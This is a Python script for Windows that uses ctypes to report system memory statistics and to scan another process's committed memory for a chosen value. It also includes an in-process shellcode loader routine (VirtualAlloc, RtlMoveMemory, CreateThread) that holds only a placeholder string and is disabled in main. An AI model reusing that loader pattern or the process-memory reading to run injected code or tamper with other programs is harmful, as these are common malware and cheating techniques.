import ctypes
from ctypes import *
from ctypes.wintypes import *
import ctypes.wintypes as wt
import psutil
import platform
import win32com.client
import logging

# Global Variable
PVOID = LPVOID
SIZE_T = ctypes.c_size_t
if ctypes.sizeof(ctypes.c_void_p) == ctypes.sizeof(ctypes.c_ulonglong):
        DWORD_PTR = ctypes.c_ulonglong
elif ctypes.sizeof(ctypes.c_void_p) == ctypes.sizeof(ctypes.c_ulong):
        DWORD_PTR = ctypes.c_ulong

'''Definition of Class'''

class SYSTEM_INFO(ctypes.Structure):
    # https://msdn.microsoft.com/en-us/library/ms724958
    class _U(ctypes.Union):
        class _S(ctypes.Structure):
            _fields_ = (('wProcessorArchitecture', WORD), 
                        ('wReserved', WORD))
        _fields_ = (('dwOemId', DWORD), ('_s', _S)) # obsolete
        _anonymous_ = ('_s',)
    _fields_ = (('_u', _U),
                ('dwPageSize', DWORD),
                ('lpMinimumApplicationAddress', LPVOID),
                ('lpMaximumApplicationAddress', LPVOID),
                ('dwActiveProcessorMask', DWORD_PTR),
                ('dwNumberOfProcessors', DWORD),
                ('dwProcessorType', DWORD),
                ('dwAllocationGranularity', DWORD),
                ('wProcessorLevel', WORD),
                ('wProcessorRevision', WORD))
    _anonymous_ = ('_u',)

class MEMORY_BASIC_INFORMATION(ctypes.Structure):
    # https://msdn.microsoft.com/en-us/library/aa366775
    _fields_ = (('BaseAddress', PVOID),
                ('AllocationBase',    PVOID),
                ('AllocationProtect', DWORD),
                ('RegionSize', SIZE_T),
                ('State',   DWORD),
                ('Protect', DWORD),
                ('Type',    DWORD))

class PERFORMANCE_INFORMATION(Structure):
    # https://learn.microsoft.com/en-us/windows/win32/apinfo/psapinfo/ns-psapinfo-performance_information
    _fields_ = (('size',               DWORD),
                ('CommitTotal',       SIZE_T),
                ('CommitLimit',       SIZE_T),
                ('CommitPeak',        SIZE_T),
                ('PhysicalTotal',     SIZE_T),
                ('PhysicalAvailable', SIZE_T),
                ('SystemCache',       SIZE_T),
                ('KernelTotal',       SIZE_T),
                ('KernelPaged',       SIZE_T),
                ('KernelNonpaged',    SIZE_T),
                ('PageSize',          SIZE_T),
                ('HandleCount',       DWORD),
                ('ProcessCount',      DWORD),
                ('ThreadCount',       DWORD))
    def __init__(self, *args, **kwds):
        super(PERFORMANCE_INFORMATION, self).__init__(*args, **kwds)
        self.size = sizeof(self)

class MEMORYSTATUSEX(ctypes.Structure):
    # https://learn.microsoft.com/en-us/windows/win32/api/sysinfoapi/ns-sysinfoapi-memorystatusex
    _fields_ = [
        ("dwLength", ctypes.c_ulong),
        ("dwMemoryLoad", ctypes.c_ulong),
        ("ullTotalPhys", ctypes.c_ulonglong),
        ("ullAvailPhys", ctypes.c_ulonglong),
        ("ullTotalPageFile", ctypes.c_ulonglong),
        ("ullAvailPageFile", ctypes.c_ulonglong),
        ("ullTotalVirtual", ctypes.c_ulonglong),
        ("ullAvailVirtual", ctypes.c_ulonglong),
        ("sullAvailExtendedVirtual", ctypes.c_ulonglong),
    ]
    def __init__(self):
        # have to initialize this to the size of MEMORYSTATUSEX
        self.dwLength = ctypes.sizeof(self)
        super(MEMORYSTATUSEX, self).__init__()

'''End definition of Class'''


# 1. get System information
def system_info():
    # https://msdn.microsoft.com/en-us/library/aa383751#DWORD_PTR
    LPSYSTEM_INFO = ctypes.POINTER(SYSTEM_INFO)
    Kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
    #Kernel32.FreeLibrary.argtypes = [wintypes.HMODULE]
    Kernel32.GetSystemInfo.restype = None
    Kernel32.GetSystemInfo.argtypes = (LPSYSTEM_INFO,)
    sysinfo = SYSTEM_INFO()
    Kernel32.GetSystemInfo(ctypes.byref(sysinfo))
    return Kernel32,sysinfo

 
# 2. get Open process
def getProcess(Kernel32,sysinfo):
    PID = None
    name = ""
    print(psutil.cpu_times())
    print(psutil.cpu_stats())
    print(psutil.virtual_memory())
    print(psutil.swap_memory())
    print(psutil.disk_partitions())
    print(psutil.disk_usage('/'))
    #print(psutil.disk_io_counters())
    #print(psutil.pinfods())

    print("\n"+' PROCESS INFO '.center(102, '='))
    for proc in psutil.process_iter():
        #if str('chrome.exe') in str(proc.name) and proc.memory_info().rss > 200000000:
        if proc.memory_info().rss > 200000000:
            ''' Resident Set Size (RSS)
                驻留集大小 (RSS) 是主内存 (RAM) 中的进程占用的内存部分
            '''
            PID = proc.pid
            name = str(proc.name)
            name = name.replace('<bound method Process.name of psutil.Process(','').replace(')>','').replace(',','\t')
            print(name,'\tRSS:',proc.memory_info().rss)
            
    PROCESS_QUERY_INFORMATION = 0x0400
    PROCESS_VM_READ = 0x0010
    
    print("")
    print("Minimum Application Address:",sysinfo.lpMinimumApplicationAddress)
    print("Maximum Application Address:",sysinfo.lpMaximumApplicationAddress)
    print("PID:",PID)
    Process = Kernel32.OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, False, PID)
    print('process:', Process)
    return Process


# 3. MBI
def getMBI(Kernel32,sysinfo,Process):
    mbi = MEMORY_BASIC_INFORMATION()
    print('VirtualQueryEx ran properly?',Kernel32.VirtualQueryEx(Process, sysinfo.lpMinimumApplicationAddress, ctypes.byref(mbi),ctypes.sizeof(mbi)))
    print("")
    print(' MBI info '.center(30,"="))
    Kernel32.VirtualQueryEx(Process, sysinfo.lpMinimumApplicationAddress, ctypes.byref(mbi),ctypes.sizeof(mbi))
    print('mbi.BaseAddress: ',mbi.BaseAddress)
    print('mbi.AllocationBase: ',mbi.AllocationBase)
    print('mbi.AllocationProtect: ',mbi.AllocationProtect)
    print('mbi.RegionSize: ',mbi.RegionSize)
    print('mbi.State: ',mbi.State)
    print('mbi.Protect: ', mbi.Protect)
    print('mbi.Type: ',mbi.Type)
    print("")
 

def scanMBI(Kernel32,sysinfo,Process,target_value = 8, print_hitpool = False):
    hitpool = list()
    hit_count = 0
    mbi = MEMORY_BASIC_INFORMATION()
    Kernel32.VirtualQueryEx(Process, sysinfo.lpMinimumApplicationAddress, ctypes.byref(mbi),ctypes.sizeof(mbi))
    ReadProcessMemory = Kernel32.ReadProcessMemory
    
    MEM_COMMIT = 0x00001000
    PAGE_READWRITE = 0x04
    buffer = ctypes.c_double()
    nread = SIZE_T()
    start_address = mbi.BaseAddress
    current_address = sysinfo.lpMinimumApplicationAddress
    end_address = sysinfo.lpMaximumApplicationAddress

    print("")
    print('Start    |  End Address     |  Current Address  | Remarks')
    print(''.center(65, '-'))
    
    while current_address < end_address:
        if(hex(current_address) <= '0x10000'):
            end_str = '\t\t| '
        else:
            end_str = '\t| '
        print(hex(start_address),' | ',hex(end_address),' | ',hex(current_address),end=end_str)
        Kernel32.VirtualQueryEx(Process, ctypes.c_void_p(current_address), ctypes.byref(mbi),ctypes.sizeof(mbi))
    
        if mbi.Protect == PAGE_READWRITE and mbi.State == MEM_COMMIT :
            print('此区域可被扫描',end = "")
            index = current_address
            end = current_address + mbi.RegionSize
    
            for i in range(index, end, 40):
                if ReadProcessMemory(Process, ctypes.c_void_p(index), ctypes.byref(buffer), ctypes.sizeof(buffer), ctypes.byref(nread)):
                    ## value comparison to be implemented.
                    if buffer.value < (target_value + 1) and buffer.value > (target_value - 1):
                        hit_count += 1
                        hitpool.append(i)
                else:
                    pass
                    #raise ctypes.WinError(ctypes.get_last_error())
                index += ctypes.sizeof(buffer)
            print('')
        else:
            print('')
        current_address += mbi.RegionSize

    if print_hitpool:
        print("")
        print("Length of Hitpool:",len(hitpool))
        print("")
        print(" Hitpool ".center(96,"="))
        k = 1
        while k < len(hitpool):
            if k % 6 == 0:
                end_str = "\n"
            else:
                end_str = "\t"
            print(hex(hitpool[k]),end=end_str)
            k += 1
        print("")

# 4. Virtual allocation
def getVirtualAlloc(kernel32):
    MEM_COMMIT = 0x1000
    PAGE_READWRITE_EXECUTE = 0x40
    PAGE_READ_EXECUTE = 0x20

    shellcode = None
    print("")
    if shellcode is None and platform.architecture()[0] == '64bit':
        print('Architecture is 64-bit.\n')
        shellcode = 'x64'
    else:
        print('Architecture is 32-bit.\n')
        shellcode = 'x86'
    VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc
    VirtualAlloc.argtypes = [
        wt.LPVOID, ctypes.c_size_t, wt.DWORD, wt.DWORD
    ]
    VirtualAlloc.restype = wt.LPVOID

    # RtlMoveMemory()
    RtlMoveMemory = ctypes.windll.kernel32.RtlMoveMemory
    RtlMoveMemory.argtypes = [wt.LPVOID, wt.LPVOID, ctypes.c_size_t]
    RtlMoveMemory.restype = wt.LPVOID

    # VirtualProtect()
    VirtualProtect = ctypes.windll.kernel32.VirtualProtect
    VirtualProtect.argtypes = [
        wt.LPVOID, ctypes.c_size_t, wt.DWORD, wt.LPVOID
    ]
    VirtualProtect.restype = wt.BOOL

    # CreateThread()
    CreateThread = ctypes.windll.kernel32.CreateThread
    CreateThread.argtypes = [
        wt.LPVOID, ctypes.c_size_t, wt.LPVOID,
        wt.LPVOID, wt.DWORD, wt.LPVOID
    ]
    CreateThread.restype = wt.HANDLE
    
    # WaitForSingleObject
    WaitForSingleObject = kernel32.WaitForSingleObject
    WaitForSingleObject.argtypes = [wt.HANDLE, wt.DWORD]
    WaitForSingleObject.restype = wt.DWORD
    print("".center(60,'='))
    print("  Shellcode Resident in Same Process using VirtualAlloc()")
    print("".center(60,'='))

    memptr = VirtualAlloc(0, len(shellcode), MEM_COMMIT, PAGE_READWRITE_EXECUTE)
    print('VirtuallAlloc() Memory at: {:08X}'.format(memptr))
    RtlMoveMemory(memptr, shellcode , len(shellcode))
    print('Shellcode copinfoed into memory.')
    VirtualProtect(memptr, len(shellcode), PAGE_READ_EXECUTE, 0)
    print('Changed permissions on memory to READ_EXECUTE only.')
    thread = CreateThread(0, 0, memptr, 0, 0, 0)
    print('CreateThread() in same process.')
    WaitForSingleObject(thread, 0xFFFFFFFF)

# 5. Memory Status
def getPerformanceInfo():
    # http://msdn.microsoft.com/en-us/library/ms683210
    pinfo = PERFORMANCE_INFORMATION()
    windll.psapi.GetPerformanceInfo(ctypes.byref(pinfo), ctypes.sizeof(pinfo))
    pinfo.SystemCacheBytes = (pinfo.SystemCache * pinfo.PageSize)

    # Get Memory Status
    # keep the unit consistent with Linux guests
    memStats = {}
    memStats['Total physical memory'] = str(int((pinfo.PhysicalTotal * pinfo.PageSize) / 1024))
    memStats['Free physical memory'] = str(int((pinfo.PhysicalAvailable * pinfo.PageSize) / 1024))
    memStats['Unused physical memory'] = memStats['Free physical memory']
    memStats['Cached memory'] = str(int((pinfo.SystemCache * pinfo.PageSize) / 1024))
    #memStats['Buffer memory'] = 0  # TODO: Can this be reported?

    try:
        strComputer = "."
        objWMIService = win32com.client.Dispatch("WbemScripting.SWbemLocator")
        objSWbemServices = objWMIService.ConnectServer(strComputer, "root\\cimv2")
        colItems = objSWbemServices.ExecQuery("SELECT * FROM Win32_OperatingSystem")
        for objItem in colItems:
            # https://learn.microsoft.com/en-us/windows/win32/cimwin32prov/win32-operatingsystem
            memStats['Total virtual memory'] = objItem.TotalVirtualMemorySize
            memStats['Free virtual memory'] = objItem.FreeVirtualMemory
            memStats['Max process memory'] = objItem.MaxProcessMemorySize
            memStats['Paging free space'] = objItem.FreeSpaceInPagingFiles
            memStats['Paging stored size'] = objItem.SizeStoredInPagingFiles
            
    except:
        logging.exception("Error retrieving detailed memory stats")
        print("Error retrieving detailed memory stats")
    try:
        strComputer = "."
        objWMIService = win32com.client.Dispatch("WbemScripting.SWbemLocator")
        objSWbemServices = objWMIService.ConnectServer(strComputer, "root\\cimv2")
        colItems = objSWbemServices.ExecQuery("SELECT * FROM Win32_PageFileUsage")
        for objItem in colItems:
            # Keep the unit consistent with Linux guests (KiB)
            memStats['Total swap space usage'] = objItem.CurrentUsage * 1024
            memStats['Total swap space size'] = objItem.AllocatedBaseSize * 1024
    except Exception:
        logging.exception("Failed to retrieve page file stats")
        print("Failed to retrieve page file stats")
        pass
    print("")
    print("".center(46,'='))
    print("  Get Mem Status using GetPerformanceInfo() ")
    print("".center(46,'='))
    print('Available RAM\t\t{:.0f}'.format((pinfo.PhysicalAvailable * pinfo.PageSize) / (1024 ** 2)))
    for item in memStats:
        if len(item) <=15 :
            separate = '\t\t'
        else:
            separate = '\t'
        print(item+separate+str(memStats[item]))
    print("")


# 6. Global memory status
def globalStat():
    stat = MEMORYSTATUSEX()
    ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(stat))
    print("".center(48,'='))
    print("  Get Mem Status using GlobalMemoryStatusEx() ")
    print("".center(48,'='))
    print("Memory Load\t%d%%" % (stat.dwMemoryLoad))
    print("Total Physical\t%d" % (stat.ullTotalPhys))
    print("Avail Physical\t%d" % (stat.ullAvailPhys))
    print("Total Pagefile\t%d" % (stat.ullTotalPageFile))
    print("Avail Pagefile\t%d" % (stat.ullAvailPageFile))
    print("Total Virtual\t%d" % (stat.ullTotalVirtual))
    print("Avail Virtual\t%d" % (stat.ullAvailVirtual))
    

if __name__ == "__main__":
    Kernel32,sysinfo = system_info()
    Process = getProcess(Kernel32,sysinfo)
    getMBI(Kernel32,sysinfo,Process)
    scanMBI(Kernel32,sysinfo,Process,print_hitpool=True)
    #getVirtualAlloc(Kernel32)
    getPerformanceInfo()
    globalStat()
    